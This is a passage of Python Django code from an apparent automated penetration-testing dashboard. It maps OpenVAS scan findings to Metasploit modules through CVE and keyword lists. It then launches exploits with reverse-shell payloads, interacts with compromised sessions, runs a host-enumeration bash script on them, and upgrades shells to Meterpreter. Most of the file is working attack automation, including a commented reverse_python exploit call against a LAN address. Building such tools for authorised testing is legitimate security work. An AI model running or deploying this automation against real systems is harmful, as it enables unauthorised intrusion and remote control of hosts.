5484","CVE-2022-41288","CVE-2022-41287","CVE-2022-41286","CVE-2022-41285","CVE-2022-41284","CVE-2022-41283","CVE-2022-41282","CVE-2022-41281","CVE-2022-41280","CVE-2022-41279","CVE-2022-41278","CVE-2021-44695","CVE-2021-44694","CVE-2021-44693","CVE-2021-40365","CVE-2022-25630","CVE-2022-44930","CVE-2022-45934","CVE-2022-38649","CVE-2022-45188","CVE-2022-41106","CVE-2022-41104","CVE-2022-41063","CVE-2022-30694","CVE-2022-42823","CVE-2022-3640","CVE-2022-31765","CVE-2022-3176","CVE-2022-38020","CVE-2022-38012","CVE-2022-38010","CVE-2022-38009","CVE-2022-38008","CVE-2022-38006","CVE-2022-38005","CVE-2022-38004","CVE-2022-37969","CVE-2022-37964","CVE-2022-37963","CVE-2022-37962","CVE-2022-37961","CVE-2022-37959","CVE-2022-37958","CVE-2022-37957","CVE-2022-37956","CVE-2022-37955","CVE-2022-37954","CVE-2022-35841","CVE-2022-35840","CVE-2022-35838","CVE-2022-35837","CVE-2022-35836","CVE-2022-35835","CVE-2022-35834","CVE-2022-35833","CVE-2022-35832","CVE-2022-35831","CVE-2022-35830","CVE-2022-35823","CVE-2022-35805","CVE-2022-35803","CVE-2022-34734","CVE-2022-34733","CVE-2022-34732","CVE-2022-34731","CVE-2022-34730","CVE-2022-34729","CVE-2022-34728","CVE-2022-34727","CVE-2022-34726","CVE-2022-34725","CVE-2022-34724","CVE-2022-34723","CVE-2022-34722","CVE-2022-34721","CVE-2022-34720","CVE-2022-34719","CVE-2022-34718","CVE-2022-34700","CVE-2022-33679","CVE-2022-33647","CVE-2022-30200","CVE-2022-30196","CVE-2022-30170","CVE-2022-26928","CVE-2022-39158","CVE-2022-31251","CVE-2022-21950","CVE-2022-2978","CVE-2021-3800","CVE-2022-36323","CVE-2022-1158","CVE-2022-29187","CVE-2022-34663","CVE-2022-26649","CVE-2022-26648","CVE-2022-26647","CVE-2022-35230","CVE-2022-35229","CVE-2022-21952","CVE-2022-22978","CVE-2022-29581","CVE-2022-29156","CVE-2022-25622","CVE-2021-40368","CVE-2022-21946","CVE-2022-24919","CVE-2022-24917","CVE-2022-24349","CVE-2022-24716","CVE-2021-42020","CVE-2021-42019","CVE-2021-42018","CVE-2021-42017","CVE-2021-42016","CVE-2021-37208","CVE-2022-0020","CVE-2021-37205","CVE-2021-37204","CVE-2021-37185","CVE-2022-21944","CVE-2021-3802","CVE-2021-44225","CVE-2021-41259","CVE-2021-40364","CVE-2021-40359","CVE-2021-40358","CVE-2021-33737","CVE-2021-34481","CVE-2019-18906","CVE-2021-25317","CVE-2021-25314","CVE-2021-25316","CVE-2021-27927","CVE-2020-35391","CVE-2020-17521","CVE-2020-15803","CVE-2019-19301","CVE-2019-19282","CVE-2019-13946","CVE-2019-10923","CVE-2019-15132","CVE-2019-13118","CVE-2019-6568","CVE-2018-20669","CVE-2018-17236","CVE-2018-17235","CVE-2018-14446","CVE-2018-14403","CVE-2018-14379","CVE-2018-14326","CVE-2018-14325","CVE-2018-14054","CVE-2018-4843","CVE-2016-6813","CVE-2017-9095","CVE-2017-11164"]
exploit_lists=keywords = [
    "rlogin",
    "distcc",
    "vsftpd",
    "ingreslock",
    "possible",
    "backdoor",
    "distributed",
    "drb",
    "brute",
    "force",
    "Logins",
    "samba",
    "apache",
    "ssh",
    "ftp",
    "http",
    "mysql",
    "oracle",
    "postgreSQL",
    "windows",
    "linux",
    "cisco",
    "drupal",
    "wordpress",
    "joomla",
    "struts",
    "tomcat",
    "rexec",
    "iis",
    "nginx",
    "php",
    "python",
    "ruby",
    "java",
    "coldfusion",
    "telnet",
    "dns",
    "dhcp",
    "snmp",
    "smtp",
    "pop3",
    "imap",
    "ssl",
    "tls",
    "vpn",
    "vnc",
    "rdp",
    "mongodb",
    "redis",
    "memcached",
    "solr",
    "elasticsearch",
    "kibana",
    "logstash",
    "filebeat",
    "heartbeat",
    "osquery",
    "syslog",
    "splunk",
    "rsync",
    "sftp",
    "ldap",
    "active_directory",
    "kerberos",
    "cifs",
    "smb",
    "nfs",
    "afp",
    "hadoop",
    "hbase",
    "cassandra",
    "spark",
    "hive",
    "zookeeper",
    "kafka",
    "rabbitmq",
    "activemq",
    "mqtt",
    "owncloud",
    "nextcloud",
    "seafile",
    "git",
    "svn",
    "mercurial",
    "jenkins",
    "travis_ci",
    "circleci",
    "gitlab",
    "bitbucket",
    "aws",
    "azure",
    "gcp",
    "openstack",
    "vmware",
    "virtualbox",
    "hyper-v",
    "xen",
    "kvm",
    "docker",
    "kubernetes",
    "openshift",
    "ansible",
    "chef",
    "puppet",
    "saltstack",
    "terraform",
    "vagrant",
    "wireshark",
    "tcpdump",
    "nmap",
    "metasploit",
    "burp_suite",
    "owasp_zap",
    "sqlmap",
    "nikto",
    "armitage",
    "cain_and_abel",
    "john_the_ripper",
    "hashcat",
    "aircrack-ng",
    "ettercap",
    "kali_linux",
    "parrot_security_os",
    "tails",
    "whonix",
    "tor",
    "i2p",
    "freenet",
    "gnunet",
    "openbazaar",
    "zeronet",
    "freelan",
    "cjdns",
    "yacy",
    "freenas",
    "openmediavault",
    "owncloud",
    "nextcloud",
    "seafile",
    "pydio",
    "filezilla",
    "winscp",
    "rclone",
    "restic",
    "borgbackup",
    "duplicity",
    "bacula",
    "bareos",
    "timeshift",
        "pfsense",
    "opnsense",
    "Endian",
    "ClearOS",
    "Untangle",
    "Zentyal",
    "Smoothwall",
    "Endian",
    "VyOS",
    "mikrotik",
    "juniper",
    "checkpoint",
    "fortinet",
    "palo_alto",
    "sonicwall",
    "watchguard",
    "fireeye",
    "wi-fi",
    "bluetooth",
    "nfc",
    "rfid",
    "zigbee",
    "z-wave",
    "webrtc",
    "sip",
    "h.323",
    "rtsp",
    "mjpeg",
    "onvif",
    "poe",
    "rtmp",
    "dlna",
    "upnp",
    "bonjour",
    "xmpp",
    "jabber",
    "irc",
    "matrix",
    "riot",
    "signal",
    "wire",
    "wickr",
    "threema",
    "protonmail",
    "tutanota",
    "gpg",
    "pgp",
    "openssl",
    "lets_encrypt",
    "certbot",
    "acme",
    "dmvpn",
    "gre",
    "ipsec",
    "l2tp",
    "openvpn",
    "pptp",
    "softether",
    "sstp",
    "tinc",
    "wireguard",
    "zerotier",
    "freeradius",
    "openldap",
    "radius",
    "tacacs",
    "pam",
    "oauth",
    "openid",
    "sso",
    "saml",
    "x.509",
    "pkcs",
    "rfc",
    "iana",
    "cve",
    "nist",
    "owasp",
    "sans",
    "iso",
    "pci_dss",
    "gdpr",
    "hipaa",
    "nist_csf",
    "cis",
    "fips",
    "cc",
    "eal",
    "iso",
    "enisa",
    "eugdpr",
    "ccpa",
    "lgpd",
    "pdpa",
    "pecr",
    "pipeda",
    "app",
    "ipa",
    "apk",
    "xapk",
    "obb",
    "pwa",
    "uwp",
    "exe",
    "msi",
    "deb",
    "rpm",
    "snap",
    "flatpak",
    "appimage",
    "pkg",
    "dmg",
    "iso",
    "img",
    "bin",
    "tar",
    "gz",
    "xz",
    "bz2",
    "7z",
    "zip",
    "rar",
    "lha",
    "arj",
    "cab",
    "zpaq",
    "paq",
    "lrzip",
    "zstd",
    "brotli",
    "lz4",
    "lzo",
    "lzma",
    "ppmd",
]

def exploit(module, payload, rhost, rport, uri, lhost, lport):
    subprocess.run(["python", "./Core/tools/send_data.py", host_name,
                   "start attack"], capture_output=True, text=True)
    console = client.consoles.console()
    console.read()
    console.write("use " + module)
    subprocess.run(["python3", "./Core/tools/send_data.py", host_name,
                   console.read()['data']], capture_output=True, text=True)
    time.sleep(2)
    if payload != None:
        console.write("set payload " + payload)
        subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                   text=True)
    if lhost != None:
        console.write("set lhost " + lhost)
        subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                       text=True)
    if lport != None:
        console.write("set lport " + lport)
        subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                       text=True)
    if uri is None:
        if rport != None:
            console.write("set rport " + rport)
            subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                           text=True)
    else:
        console.write("set uri " + uri)
        subprocess.run(["python3", "./Core/tools/send_data.py", host_name, console.read()['data']], capture_output=True,
                       text=True)
    console.write('exploit')
    while True:
        output = console.read()['data']
        if output != "":
            subprocess.run(["python3", "./Core/tools/send_data.py", host_name, output], capture_output=True,
                           text=True)
        # if "complete" in output:
        #     console.write('save /home/copv/output/'+payload+rhost+'.txt')
        if "Exploit completed" in output:
            subprocess.run(["python", "./Core/tools/send_data.py", host_name, output], capture_output=True,
                           text=True)
            break
        if "Command shell session" in output:
            subprocess.run(["python3", "./Core/tools/send_data.py", host_name, output], capture_output=True,
                           text=True)
            break


def extract_keywords(text):
    words = nltk.word_tokenize(text)
    stop_words = set(stopwords.words('english'))
    keywords = [word for word in words if word.lower() not in stop_words]
    # Thêm vào đoạn mã này để bao gồm các từ như "dRuby" và "DRb"
    additional_keywords = re.findall(
        r'\b(?:[a-z]+[A-Z]|[A-Z]+[a-z])[a-zA-Z0-9]*\b', text)
    keywords+=additional_keywords
    keywords=[child for child in keywords if child.lower() in exploit_lists]
    return list(set(keywords))

def rank(key):
    if key=="excellent":
        return 1
    return 0

class Auto(View):
    def get(self, request, id1, **kwargs):
        host = request.get_host()
        username = request.user.username
        
        vuln = gvm.get_result(id=id1)
        print(vuln)
        
        et = ET.fromstring(vuln).find("result")
        name = et.find('name').text
        port = et.find('port').text.split('/')[0]
        print(port)
        cve = None if et.find('nvt').find('refs') is None else et.find('nvt').find("refs").findall('ref')
        search_cve=[]
        if cve !=None:
            search_cve = [child.attrib['id'] for child in cve if child.attrib['type']=="cve"]

        cve_results =[]
        for child in search_cve:
            results = client.call('module.search', [child])
            results = [str(child) for child in results]
            cve_results.extend(results)
        counter = Counter(list(cve_results))
        cve_result = sorted(counter.items(), key=lambda x: x[1], reverse=True)
        cve_result = [eval(child[0]) for child in cve_result[0:5] if child[1]==cve_result[0][1]]
        cve_result=[{"name":child['name']+" : "+child["fullname"], "module":child["fullname"]}for child in cve_result][0:5]
        search_term = extract_keywords(name)
        print(search_term)
        search_results = []
        for child in search_term:
            results = client.call('module.search', [child])
            results = [str(child) for child in results]
            search_results.extend(results)
        counter = Counter(list(search_results))
        result = sorted(counter.items(), key=lambda x: x[1], reverse=True)
        # print(result[0])
        results = [eval(child[0]) for child in result[0:50] if child[1]==result[0][1]]
        exploits = [{"name":child['name']+" : "+child["fullname"], "module":child["fullname"]}for child in results][0:50]
        host = et.find('host').text
        exploits.insert(0,"")
        return render(request, "dashboard/auto.html", {"username": username, "exploits": exploits, 'host':host, 'name':name, "port" :port})
    def post(self, request, **kwargs):
        host_name = request.get_host()

        host = request.POST['ip']
        module = request.POST['exploit']
        payload = request.POST['payload']
        rport = request.POST.get('rport', None)
        lhost = request.POST.get('lhost', None)
        lport = request.POST.get('lport', None)
        uri = request.POST.get('uri', None)
        print("auto")
        threading.Thread(target=exploit(module=module, payload=payload,
                         rhost=host, rport=rport, uri=uri, lhost=lhost, lport=lport)).start()

        username = request.user.username
        exploits = client.modules.exploits
        exploits.insert(0, '')
        # return HttpResponse("hello")
        return render(request, "dashboard/index.html", {"username": username, "exploits": exploits})


class Main(View):
    def get(self, request, **kwargs):
        username = request.user.username
        module = Exploit.objects.all()
        exploits = client.call('module.search', [''])#client.modules.exploits
        exploits=[{"name":child['name']+" : "+child['fullname'], "module":child['fullname']}for child in exploits]
        exploits.insert(0, '')


        return render(request, "dashboard/index.html", {"username": username, "exploits": exploits})

    def post(self, request, **kwargs):
        host = request.get_host()
        host = request.POST['ip']
        module = request.POST['exploit']
        payload = request.POST['payload']
        rport = request.POST.get('rport', None)
        lhost = request.POST.get('lhost', None)
        lport = request.POST.get('lport', None)
        uri = request.POST.get('uri', None)
        threading.Thread(target=exploit(module=module, payload=payload,
                         rhost=host, rport=rport, uri=uri, lhost=lhost, lport=lport)).start()

        username = request.user.username
        exploits = client.modules.exploits
        exploits.insert(0, '')
        # return HttpResponse("hello")
        return render(request, "dashboard/index.html", {"username": username, "exploits": exploits})


def run_session(session):
    cid = client.consoles.console().cid
    console = client.consoles.console(cid)
    st = threading.Thread(target=console.write("sessions -i " + str(session)))
    st.start()
    timeout = time.time() + 10
    while True:
        data = console.read()
        time.sleep(0.2)
        if "Invalid session identifier" in data['data']:
            return None, data['data'], None
        if time.time() > timeout:
            return None, "Time out", None
        if ("Starting interaction with") in data['data']:
            return console, data['data'], cid


consoles = []
for session in client.sessions.list:
    console, data, cid = run_session(session)
    consoles.append(console)


def run_command(console, cmd):
    console.write(cmd)
    timeout = time.time() + 2
    while True:
        time.sleep(0.3)
        output = console.read()
        if output['data'] != "":
            print(output)
            return output
        if time.time() > timeout:
            return output


def console():
    return client.consoles.console()

class ReportMetasploit(View):
    def get(self, request):
        tree = ET.parse('Core/report/report.xml')
        root = tree.getroot()
        hosts = root.find("hosts").findall('host')
        reponse = [{"name": child.find('name').text, "os_name": child.find('os-name').text, "os_family": child.find('os-family').text,
                    "detected_arch":  child.find('detected-arch').text, "address": child.find('address').text,
                    "vulns": [{"id": x.find("id").text, "created_at": x.find("created-at").text, "updated_at": x.find("updated-at").text,
                            "name": x.find("name").text, "info": x.find("info").text,
                            "refs": [ref.text for ref in x.find("refs").findall("ref")],
                            } for x in child.find('vulns')
                            ]
                    } for child in hosts]
        print(reponse)
        return render(request, "dashboard/reports.html", {"reponse":reponse})
    def post(self, request):
        console1 = console()
        run_command(console=console1, cmd="db_export -f xml -a /home/copv/Documents/final-project/Opra/Core/report/report.xml")
        return redirect('/opra/report_metasploit/')

class ReportMetasploitByIp(View):
    def get(self, request, ip):
        tree = ET.parse('Core/report/report.xml')
        root = tree.getroot()
        hosts = root.find("hosts").findall('host')
        reponse = [{"name": child.find('name').text, "os_name": child.find('os-name').text, "os_family": child.find('os-family').text,
                    "detected_arch":  child.find('detected-arch').text, "address": child.find('address').text,
                    "vulns": [{"id": x.find("id").text, "created_at": x.find("created-at").text, "updated_at": x.find("updated-at").text,
                            "name": x.find("name").text, "info": x.find("info").text,
                            "refs": [ref.text for ref in x.find("refs").findall("ref")],
                            } for x in child.find('vulns')
                            ]
                    } for child in hosts if child.find('address').text ==ip]
        print(reponse)
        return render(request, "dashboard/report.html", {"reponse":reponse})
    
class LoadSessions(View):
    def get(self, request):
        # threading.Thread(target=exploit(module='exploit/linux/misc/drb_remote_codeexec', payload="cmd/unix/reverse_python", rhost="192.168.1.25",rport=None, lport=None, lhost=None, uri=None)).run()
        sessions = {"sessions": client.sessions.list}
        # sessions = {"sessions": [{'name':"name", 'host':"127.0.0.1"},{'host':"1.1.1.1"}]}
        # sessions={"id":100}
        return JsonResponse(sessions)


class LoadPayloads(View):
    def get(self, request):
        payloads = {}
        return JsonResponse(payloads)


class LoadSessionId(View):

    system_info = """readarray -t array <<< "$(df -h)";
var=$(echo "${array[1]}"| grep -aob '%' | grep -oE '[0-9]+');
df_output="${array[3]:$var-3:4}";

manufacturer=$(cat /sys/class/dmi/id/chassis_vendor);
product_name=$(cat /sys/class/dmi/id/product_name);
version=$(cat /sys/class/dmi/id/bios_version);
serial_number=$(cat /sys/class/dmi/id/product_serial);
hostname=$(hostname);
operating_system=$(hostnamectl | grep "Operating System" | cut -d ' ' -f3-);
processor_name=$(awk -F':' '/^model name/ {print $2}' /proc/cpuinfo | uniq | sed -e 's/^[ \t]*//');
memory=$(dmidecode -t 17 | grep "Size" | awk '{s+=$2} {b=$3} END {print s b}');



printf '{"manufacturer":"%s","product_name":"%s","version":"%s","serial_number":"%s","hostname":"%s","operating_system":"%s","processor_name":"%s","memory":"%s"}' "$manufacturer" "$product_name" "$version" "$serial_number" "$hostname" "$operating_system" "$processor_name" "$memory"
"""

    def byte_to_json(self, output):
        try:
            return json.loads(output.decode('utf8'))
        except:
            return b"{}"
            raise

    def get(self, request, id):
        ip = client.sessions.list[str(id)]['session_host']
        network = []
        system = {}
        try:
            console, data, cid = run_session(int(id))
            data = run_command(console, "ip addr")['data']
            network = re.split(r'\n[0-9]:', data)
            system = run_command(console, self.system_info)
            system = system['data'].split('\n')[-1]
            if system == "":
                system = "{}"
            # console.write("background")
            # console.read()

            system = json.loads(system)
            console.write("background")
            del console
        except Exception as e:
            print(e)
            pass

        # # get_system_info = Info.connection_bash_execute(file=self.system_info, ip=ip)
        # get_disk_info = Info.connection_ssh_execute(command="lsblk --json", ip=ip)
        # get_network_info = Info.connection_ssh_execute(command="ip --json address", ip=ip)
        # get_systemctl = Info.connection_ssh_execute(
        #     command="systemctl list-units --type=service --state=active -o json", ip=ip)
        #
        # # get_system_info_json = self.byte_to_json(get_system_info)
        # get_system_disk_json = self.byte_to_json(get_disk_info)
        # get_system_network_json = self.byte_to_json(get_network_info)
        # get_systemctl_list_json = self.byte_to_json(get_systemctl)
        session = client.sessions.list[str(id)]
        return render(request, 'client/clientinfo.html', {'id': id, 'ip': ip, 'system_network': network, 'client_info': system, 'session': session})


class Msf(View):
    def get(self, request, id):
        ids = {'id': id}
        return render(request, 'dashboard/msf.html', ids)


class Module(View):
    def get(self, request):
        module = request.GET['module']
        print(module)
        if "exploit" in module:
            payloads = client.modules.use('exploit', module).payloads
            payloads = {'payloads': payloads}
            return JsonResponse(payloads)
        return HttpResponse(status="404")


class Message(View):
    def get(self, request):
        return render(request, 'dashboard/message.html')


class Meterpreter(View):
    def get(self, request, id):
        console = client.consoles.console()
        console.read()
        console.write("use post/multi/manage/shell_to_meterpreter")
        time.sleep(0.5)
        console.write("set SESSION "+str(id))
        console.write("run")
        time.sleep(5)
        print(console.read())
        return HttpResponseRedirect("/oprs/")


class Info(View):
    def get(self, request, ip):
        return JsonResponse({'ram': 0, 'cpu': 0, 'disk': 0})

    def post(self, request, ip):
        try:
            return JsonResponse(
                {'ram': random.randint(3, 9), 'cpu': random.randint(3, 9), 'disk': random.randint(3, 9)})
        except Exception as e:
            print(e)
            return JsonResponse({'ram': 0, 'cpu': 0, 'disk': 0})
